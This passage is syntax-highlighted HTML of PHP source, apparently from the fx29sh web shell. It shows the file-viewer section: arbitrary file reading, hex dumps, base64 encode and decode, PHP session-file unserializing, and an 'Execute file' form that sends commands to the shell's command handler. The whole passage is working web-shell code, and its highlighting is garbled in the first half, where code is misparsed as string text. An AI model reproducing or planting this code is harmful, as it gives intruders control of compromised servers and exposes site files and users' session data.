<span class="lineno">2024</span> <span class="s2">    }</span>
<span class="lineno">2025</span> <span class="s2">  }</span>
<span class="lineno">2026</span> <span class="s2">  ###[ FILE ]###</span>
<span class="lineno">2027</span> <span class="s2">  if (</span><span class="si">$act</span><span class="s2"> == &quot;</span><span class="nx">f</span><span class="s2">&quot;) {</span>
<span class="lineno">2028</span> <span class="s2">    echo &quot;</span><span class="o">&lt;</span><span class="nx">div</span> <span class="nx">align</span><span class="o">=</span><span class="nx">left</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno">2029</span> <span class="s2">    if (!isset(</span><span class="si">$ft</span><span class="s2">)) { </span><span class="si">$ft</span><span class="s2"> = &quot;&quot;; }</span>
<span class="lineno">2030</span> <span class="s2">    if (!isset(</span><span class="si">$newwin</span><span class="s2">)) { </span><span class="si">$newwin</span><span class="s2"> = &quot;&quot;; }</span>
<span class="lineno">2031</span> <span class="s2">    if ((!is_readable(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$f</span><span class="s2">) or is_dir(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$f</span><span class="s2">)) and </span><span class="si">$ft</span><span class="s2"> != &quot;</span><span class="nx">edit</span><span class="s2">&quot;) {</span>
<span class="lineno">2032</span> <span class="s2">      if (file_exists(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$f</span><span class="s2">)) {</span>
<span class="lineno">2033</span> <span class="s2">        disp_error(&quot;</span><span class="nx">Access</span> <span class="nx">denied</span><span class="o">!&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="s2">&quot;.htmlspecialchars(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$f</span><span class="s2">));</span>
<span class="lineno">2034</span> <span class="s2">      }</span>
<span class="lineno">2035</span> <span class="s2">      else {</span>
<span class="lineno">2036</span> <span class="s2">        disp_error(&quot;</span><span class="nx">File</span> <span class="nx">doesn</span><span class="s1">&#39;t exists: &quot;.htmlspecialchars($d.$f).&quot;&lt;br&gt;\n&quot;.</span>
<span class="lineno">2037</span> <span class="s1">                   &quot;&lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=edit&amp;d=&quot;.urlencode($d).&quot;&amp;c=1\&quot;&gt;&lt;u&gt;Create&lt;/u&gt;&lt;/a&gt;&quot;);</span>
<span class="lineno">2038</span> <span class="s1">      }</span>
<span class="lineno">2039</span> <span class="s1">    }</span>
<span class="lineno">2040</span> <span class="s1">    else {</span>
<span class="lineno">2041</span> <span class="s1">      $r   = @file_get_contents($d.$f);</span>
<span class="lineno">2042</span> <span class="s1">      $ext = explode(&quot;.&quot;,$f);</span>
<span class="lineno">2043</span> <span class="s1">      $c   = count($ext)-1;</span>
<span class="lineno">2044</span> <span class="s1">      $ext = $ext[$c];</span>
<span class="lineno">2045</span> <span class="s1">      $ext = strtolower($ext);</span>
<span class="lineno">2046</span> <span class="s1">      $rft = &quot;&quot;;</span>
<span class="lineno">2047</span> <span class="s1">      foreach ($ftypes as $k =&gt; $v) {</span>
<span class="lineno">2048</span> <span class="s1">        if (in_array($ext,$v)) { $rft = $k; break; }</span>
<span class="lineno">2049</span> <span class="s1">      }</span>
<span class="lineno">2050</span> <span class="s1">      if (eregi(&quot;sess_(.*)&quot;,$f)) { $rft = &quot;phpsess&quot;; }</span>
<span class="lineno">2051</span> <span class="s1">      if (empty($ft)) { $ft = $rft; }</span>
<span class="lineno">2052</span> <span class="s1">      $arr = array(</span>
<span class="lineno">2053</span> <span class="s1">          array(&quot;&lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=ext_diz\&quot; alt=\&quot;Info\&quot;&gt;&quot;,&quot;info&quot;),</span>
<span class="lineno">2054</span> <span class="s1">          array(&quot;&lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=ext_html\&quot; alt=\&quot;html\&quot;&gt;&quot;,&quot;html&quot;),</span>
<span class="lineno">2055</span> <span class="s1">          array(&quot;&lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=ext_txt\&quot; alt=\&quot;txt\&quot;&gt;&quot;,&quot;txt&quot;),</span>
<span class="lineno">2056</span> <span class="s1">          array(&quot;&lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=ext_ini\&quot; alt=\&quot;ini\&quot;&gt;&quot;,&quot;ini&quot;),</span>
<span class="lineno">2057</span> <span class="s1">          array(&quot;Code&quot;,&quot;code&quot;),</span>
<span class="lineno">2058</span> <span class="s1">          array(&quot;Session&quot;,&quot;phpsess&quot;),</span>
<span class="lineno">2059</span> <span class="s1">          array(&quot;SDB&quot;,&quot;sdb&quot;),</span>
<span class="lineno">2060</span> <span class="s1">          array(&quot;&lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=ext_exe\&quot; alt=\&quot;exe\&quot;&gt;&quot;,&quot;exe&quot;),</span>
<span class="lineno">2061</span> <span class="s1">          array(&quot;&lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=ext_gif\&quot; alt=\&quot;img\&quot;&gt;&quot;,&quot;img&quot;),</span>
<span class="lineno">2062</span> <span class="s1">          array(&quot;&lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=ext_rtf\&quot; alt=\&quot;Notepad\&quot;&gt;&quot;,&quot;notepad&quot;),</span>
<span class="lineno">2063</span> <span class="s1">          array(&quot;&lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=change\&quot; alt=\&quot;Edit\&quot;&gt;&quot;,&quot;edit&quot;),</span>
<span class="lineno">2064</span> <span class="s1">          array(&quot;&lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=download\&quot; alt=\&quot;Download\&quot;&gt;&quot;,&quot;download&quot;)</span>
<span class="lineno">2065</span> <span class="s1">      );</span>
<span class="lineno">2066</span> <span class="s1">      echo &quot;&lt;div class=barheader&gt;.: File Viewer [&quot;.$f.&quot; (&quot;.view_size(filesize($d.$f)).&quot;) &quot;.view_perms_color($d.$f).&quot;) :.\n&quot;;</span>
<span class="lineno">2067</span> <span class="s1">      echo &quot;&lt;hr size=1 noshade&gt;\n&quot;;</span>
<span class="lineno">2068</span> <span class="s1">      foreach($arr as $t) {</span>
<span class="lineno">2069</span> <span class="s1">        if ($t[1] == $rft) { echo &quot;&lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=&quot;.$t[1].&quot;&amp;d=&quot;.urlencode($d).&quot;\&quot;&gt;&lt;font color=#3366FF&gt;&quot;.$t[0].&quot;&lt;/font&gt;&lt;/a&gt;&quot;; }</span>
<span class="lineno">2070</span> <span class="s1">        elseif ($t[1] == $ft) { echo &quot;&lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=&quot;.$t[1].&quot;&amp;d=&quot;.urlencode($d).&quot;\&quot;&gt;&lt;b&gt;&lt;u&gt;&quot;.$t[0].&quot;&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;&quot;; }</span>
<span class="lineno">2071</span> <span class="s1">        else { echo &quot;&lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=&quot;.$t[1].&quot;&amp;d=&quot;.urlencode($d).&quot;\&quot;&gt;&lt;b&gt;&quot;.$t[0].&quot;&lt;/b&gt;&lt;/a&gt;&quot;; }</span>
<span class="lineno">2072</span> <span class="s1">        echo &quot; (&lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=&quot;.$t[1].&quot;&amp;d=&quot;.urlencode($d).&quot;&amp;newwin=1\&quot; title=\&quot;New Window\&quot; target=\&quot;_blank\&quot;&gt;+&lt;/a&gt;) &quot;;</span>
<span class="lineno">2073</span> <span class="s1">      }</span>
<span class="lineno">2074</span> <span class="s1">      echo &quot;&lt;/div&gt;\n&quot;;</span>
<span class="lineno">2075</span> <span class="s1">      if ($ft == &quot;info&quot;) {</span>
<span class="lineno">2076</span> <span class="s1">        echo &quot;&lt;br&gt;&lt;div class=barheader&gt;Information&lt;/div&gt;\n&quot;.</span>
<span class="lineno">2077</span> <span class="s1">             &quot;&lt;table class=contents&gt;\n&quot;.</span>
<span class="lineno">2078</span> <span class="s1">             &quot;&lt;tr&gt;&lt;th&gt;Path&lt;/th&gt;&lt;td&gt;&quot;.$d.$f.&quot;&lt;/td&gt;&lt;/tr&gt;\n&quot;.</span>
<span class="lineno">2079</span> <span class="s1">             &quot;&lt;tr&gt;&lt;th&gt;Size&lt;/th&gt;&lt;td&gt;&quot;.view_size(filesize($d.$f)).&quot;&lt;/td&gt;&lt;/tr&gt;\n&quot;.</span>
<span class="lineno">2080</span> <span class="s1">             &quot;&lt;tr&gt;&lt;th&gt;MD5&lt;/th&gt;&lt;td&gt;&quot;.md5_file($d.$f).&quot;&lt;/td&gt;&lt;/tr&gt;\n&quot;;</span>
<span class="lineno">2081</span> <span class="s1">        if (!is_windows()) {</span>
<span class="lineno">2082</span> <span class="s1">          echo &quot;&lt;tr&gt;&lt;th&gt;&lt;b&gt;Owner/Group&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&quot;;</span>
<span class="lineno">2083</span> <span class="s1">          $ow = posix_getpwuid(fileowner($d.$f));</span>
<span class="lineno">2084</span> <span class="s1">          $gr = posix_getgrgid(filegroup($d.$f));</span>
<span class="lineno">2085</span> <span class="s1">          echo ($ow[&quot;name&quot;]?$ow[&quot;name&quot;]:fileowner($d.$f)).&quot;/&quot;.($gr[&quot;name&quot;]?$gr[&quot;name&quot;]:filegroup($d.$f));</span>
<span class="lineno">2086</span> <span class="s1">        }</span>
<span class="lineno">2087</span> <span class="s1">        echo &quot;&lt;tr&gt;&lt;th&gt;Perms&lt;/th&gt;&lt;td&gt;&lt;a href=\&quot;&quot;.$surl.&quot;act=chmod&amp;f=&quot;.urlencode($f).&quot;&amp;d=&quot;.urlencode($d).&quot;\&quot;&gt;&quot;.view_perms_color($d.$f).&quot;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;\n&quot;.</span>
<span class="lineno">2088</span> <span class="s1">             &quot;&lt;tr&gt;&lt;th&gt;Create time&lt;/th&gt;&lt;td&gt;&quot;.date(&quot;d/m/Y H:i:s&quot;,filectime($d.$f)).&quot;&lt;/td&gt;&lt;/tr&gt;\n&quot;.</span>
<span class="lineno">2089</span> <span class="s1">             &quot;&lt;tr&gt;&lt;th&gt;Access time&lt;/th&gt;&lt;td&gt; &quot;.date(&quot;d/m/Y H:i:s&quot;,fileatime($d.$f)).&quot;&lt;/td&gt;&lt;/tr&gt;\n&quot;.</span>
<span class="lineno">2090</span> <span class="s1">             &quot;&lt;tr&gt;&lt;th&gt;Modify time&lt;/th&gt;&lt;td&gt; &quot;.date(&quot;d/m/Y H:i:s&quot;,filemtime($d.$f)).&quot;&lt;/td&gt;&lt;/tr&gt;\n&quot;;</span>
<span class="lineno">2091</span> <span class="s1">        echo &quot;&lt;tr&gt;&lt;th&gt;HexDump&lt;/th&gt;&lt;td&gt;\n&quot;.</span>
<span class="lineno">2092</span> <span class="s1">             &quot;[ &lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=info&amp;fullhexdump=1&amp;d=&quot;.urlencode($d).&quot;\&quot;&gt;Full&lt;/a&gt; ] &quot;.</span>
<span class="lineno">2093</span> <span class="s1">             &quot;[ &lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=info&amp;d=&quot;.urlencode($d).&quot;\&quot;&gt;Preview&lt;/a&gt; ]&lt;br&gt;\n&quot;.</span>
<span class="lineno">2094</span> <span class="s1">             &quot;&lt;/td&gt;&lt;/tr&gt;\n&quot;.</span>
<span class="lineno">2095</span> <span class="s1">             &quot;&lt;tr&gt;&lt;th&gt;Base64&lt;/th&gt;&lt;td&gt;\n&quot;.</span>
<span class="lineno">2096</span> <span class="s1">             &quot;[ &lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=info&amp;base64=1&amp;d=&quot;.urlencode($d).&quot;\&quot;&gt;Encode&lt;/a&gt; ] &quot;.</span>
<span class="lineno">2097</span> <span class="s1">             &quot;[ &lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=info&amp;base64=2&amp;d=&quot;.urlencode($d).&quot;\&quot;&gt;+chunk&lt;/a&gt; ] &quot;.</span>
<span class="lineno">2098</span> <span class="s1">             &quot;[ &lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=info&amp;base64=3&amp;d=&quot;.urlencode($d).&quot;\&quot;&gt;+chunk+quotes&lt;/a&gt; ] &quot;.</span>
<span class="lineno">2099</span> <span class="s1">             &quot;[ &lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.urlencode($f).&quot;&amp;ft=info&amp;base64=4&amp;d=&quot;.urlencode($d).&quot;\&quot;&gt;Decode&lt;/a&gt; ] &quot;.</span>
<span class="lineno">2100</span> <span class="s1">             &quot;&lt;/td&gt;&lt;/tr&gt;\n&quot;.</span>
<span class="lineno">2101</span> <span class="s1">             &quot;&lt;/table&gt;&lt;br&gt;\n&quot;;</span>
<span class="lineno">2102</span> <span class="s1">        $fi = fopen($d.$f,&quot;rb&quot;);</span>
<span class="lineno">2103</span> <span class="s1">        if ($fi) {</span>
<span class="lineno">2104</span> <span class="s1">          echo &quot;&lt;div class=barheader&gt;&quot;;</span>
<span class="lineno">2105</span> <span class="s1">          if (@$fullhexdump) { echo &quot;Full HexDump&quot;; $str = fread($fi,filesize($d.$f)); }</span>
<span class="lineno">2106</span> <span class="s1">          else { echo &quot;HexDump Preview&quot;; $str = fread($fi,$hexdump_lines*$hexdump_rows); }</span>
<span class="lineno">2107</span> <span class="s1">          $n  = 0;</span>
<span class="lineno">2108</span> <span class="s1">          $a0 = &quot;00000000&lt;br&gt;&quot;;</span>
<span class="lineno">2109</span> <span class="s1">          $a1 = &quot;&quot;;</span>
<span class="lineno">2110</span> <span class="s1">          $a2 = &quot;&quot;;</span>
<span class="lineno">2111</span> <span class="s1">          for ($i=0; $i&lt;strlen($str); $i++) {</span>
<span class="lineno">2112</span> <span class="s1">            $a1 .= sprintf(&quot;%02X&quot;,ord($str[$i])).&quot; &quot;;</span>
<span class="lineno">2113</span> <span class="s1">            switch (ord($str[$i])) {</span>
<span class="lineno">2114</span> <span class="s1">              case 0 :  $a2 .= &quot;&lt;font&gt;0&lt;/font&gt;&quot;; break;</span>
<span class="lineno">2115</span> <span class="s1">              case 32:</span>
<span class="lineno">2116</span> <span class="s1">              case 10:</span>
<span class="lineno">2117</span> <span class="s1">              case 13: $a2 .= &quot; &quot;; break;</span>
<span class="lineno">2118</span> <span class="s1">              default: $a2 .= htmlspecialchars($str[$i]);</span>
<span class="lineno">2119</span> <span class="s1">            }</span>
<span class="lineno">2120</span> <span class="s1">            $n++;</span>
<span class="lineno">2121</span> <span class="s1">            if ($n == $hexdump_rows) {</span>
<span class="lineno">2122</span> <span class="s1">              $n = 0;</span>
<span class="lineno">2123</span> <span class="s1">              if ($i+1 &lt; strlen($str)) {$a0 .= sprintf(&quot;%08X&quot;,$i+1).&quot;&lt;br&gt;&quot;;}</span>
<span class="lineno">2124</span> <span class="s1">              $a1 .= &quot;&lt;br&gt;&quot;;</span>
<span class="lineno">2125</span> <span class="s1">              $a2 .= &quot;&lt;br&gt;&quot;;</span>
<span class="lineno">2126</span> <span class="s1">            }</span>
<span class="lineno">2127</span> <span class="s1">          }</span>
<span class="lineno">2128</span> <span class="s1">          echo &quot;&lt;/div&gt;\n&quot;;</span>
<span class="lineno">2129</span> <span class="s1">          echo &quot;&lt;table class=code&gt;&lt;tr&gt;&lt;td&gt;&quot;.$a0.&quot;&lt;/td&gt;&lt;td&gt;&quot;.$a1.&quot;&lt;/td&gt;&lt;td&gt;&quot;.$a2.&quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;\n&quot;;</span>
<span class="lineno">2130</span> <span class="s1">        }</span>
<span class="lineno">2131</span> <span class="s1">        $henc = &quot;&quot;;</span>
<span class="lineno">2132</span> <span class="s1">        $encoded  = &quot;&quot;;</span>
<span class="lineno">2133</span> <span class="s1">        if (!isset($base64)) { $base64 = &quot;&quot;; }</span>
<span class="lineno">2134</span> <span class="s1">        if ($base64 == 1) {</span>
<span class="lineno">2135</span> <span class="s1">          $henc = &quot;Base64 Encode&quot;;</span>
<span class="lineno">2136</span> <span class="s1">          $encoded = base64_encode(file_get_contents($d.$f));</span>
<span class="lineno">2137</span> <span class="s1">        }</span>
<span class="lineno">2138</span> <span class="s1">        elseif($base64 == 2) {</span>
<span class="lineno">2139</span> <span class="s1">          $henc = &quot;Base64 Encode + Chunk&quot;;</span>
<span class="lineno">2140</span> <span class="s1">          $encoded = chunk_split(base64_encode(file_get_contents($d.$f)));</span>
<span class="lineno">2141</span> <span class="s1">        }</span>
<span class="lineno">2142</span> <span class="s1">        elseif($base64 == 3) {</span>
<span class="lineno">2143</span> <span class="s1">          $henc = &quot;Base64 Encode + Chunk + Quotes&quot;;</span>
<span class="lineno">2144</span> <span class="s1">          $encoded = base64_encode(file_get_contents($d.$f));</span>
<span class="lineno">2145</span> <span class="s1">          $encoded = substr(preg_replace(&quot;!.{1,76}!&quot;,&quot;&#39;</span><span class="nx">\</span><span class="o">&amp;</span><span class="c1">#92;&amp;#48;&#39;.\n&quot;,$encoded),0,-2);</span>
<span class="lineno">2146</span>         <span class="p">}</span>
<span class="lineno">2147</span>         <span class="k">elseif</span><span class="p">(</span><span class="nv">$base64</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2148</span>           <span class="nv">$text</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
<span class="lineno">2149</span>           <span class="nv">$encoded</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span>
<span class="lineno">2150</span>           <span class="nv">$henc</span> <span class="o">=</span> <span class="s2">&quot;&lt;b&gt;Base64 Decode&quot;</span><span class="p">;</span>
<span class="lineno">2151</span>           <span class="k">if</span> <span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$encoded</span><span class="p">)</span> <span class="o">!=</span> <span class="nv">$text</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$henc</span> <span class="o">.=</span> <span class="s2">&quot; (Failed!)&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2152</span>         <span class="p">}</span>
<span class="lineno">2153</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$encoded</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">2154</span>           <span class="k">echo</span> <span class="s2">&quot;&lt;div class=barheader&gt;</span><span class="si">$henc</span><span class="s2">&lt;/div&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2155</span>           <span class="k">echo</span> <span class="s2">&quot;&lt;textarea cols=100 rows=10&gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$encoded</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/textarea&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2156</span>           <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2157</span>         <span class="p">}</span>
<span class="lineno">2158</span>       <span class="p">}</span>
<span class="lineno">2159</span>       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;html&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2160</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$newwin</span><span class="p">)</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="k">echo</span> <span class="nv">$r</span><span class="p">;</span> <span class="nx">fx29shexit</span><span class="p">();</span> <span class="p">}</span>
<span class="lineno">2161</span>         <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="nv">$r</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2162</span>       <span class="p">}</span>
<span class="lineno">2163</span>       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;txt&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2164</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;center&gt;&lt;textarea cols=</span><span class="se">\&quot;</span><span class="s2">125</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">20</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$r</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/textarea&gt;&lt;/center&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2165</span>       <span class="p">}</span>
<span class="lineno">2166</span>       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;ini&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2167</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span> <span class="nb">var_dump</span><span class="p">(</span><span class="nb">parse_ini_file</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span><span class="k">TRUE</span><span class="p">));</span> <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2168</span>       <span class="p">}</span>
<span class="lineno">2169</span>       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;phpsess&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2170</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2171</span>         <span class="nv">$v</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;|&quot;</span><span class="p">,</span><span class="nv">$r</span><span class="p">);</span>
<span class="lineno">2172</span>         <span class="k">echo</span> <span class="nv">$v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2173</span>         <span class="nb">var_dump</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
<span class="lineno">2174</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2175</span>       <span class="p">}</span>
<span class="lineno">2176</span>       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;exe&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2177</span>         <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="nv">$f</span><span class="p">);</span>
<span class="lineno">2178</span>         <span class="nv">$c</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$ext</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="lineno">2179</span>         <span class="nv">$ext</span> <span class="o">=</span> <span class="nv">$ext</span><span class="p">[</span><span class="nv">$c</span><span class="p">];</span>
<span class="lineno">2180</span>         <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$ext</span><span class="p">);</span>
<span class="lineno">2181</span>         <span class="nv">$rft</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno">2182</span>         <span class="k">foreach</span> <span class="p">(</span><span class="nv">$exeftypes</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2183</span>          <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$rft</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2184</span>         <span class="p">}</span>
<span class="lineno">2185</span>         <span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%f%&quot;</span><span class="p">,</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$rft</span><span class="p">);</span>
<span class="lineno">2186</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Execute file:&lt;/b&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">2187</span>              <span class="s2">&quot;&lt;form name=</span><span class="se">\&quot;</span><span class="s2">f_xfile</span><span class="se">\&quot;</span><span class="s2"> action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> method=POST&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">2188</span>              <span class="s2">&quot;&lt;input type=hidden name=act value=cmd&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">2189</span>              <span class="s2">&quot;&lt;input type=hidden name=</span><span class="se">\&quot;</span><span class="s2">d</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">2190</span>              <span class="s2">&quot;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">cmd</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt; </span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">2191</span>              <span class="s2">&quot;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">cmd_txt</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> checked&gt; - Display in text-area</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">2192</span>              <span class="s2">&quot;&lt;input type=submit name=submit value=</span><span class="se">\&quot;</span><span class="s2">Execute</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/form&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2193</span>       <span class="p">}</span>
<span class="lineno">2194</span>       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;sdb&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span> <span class="nb">var_dump</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$r</span><span class="p">)));</span> <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2195</span>       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;code&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2196</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;div class=code style=</span><span class="se">\&quot;</span><span class="s2">background-color: &quot;</span><span class="o">.</span><span class="nv">$highlight_bg</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2197</span>         <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$newwin</span><span class="p">)</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="nb">highlight_file</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span> <span class="nx">fx29shexit</span><span class="p">();</span> <span class="p">}</span>
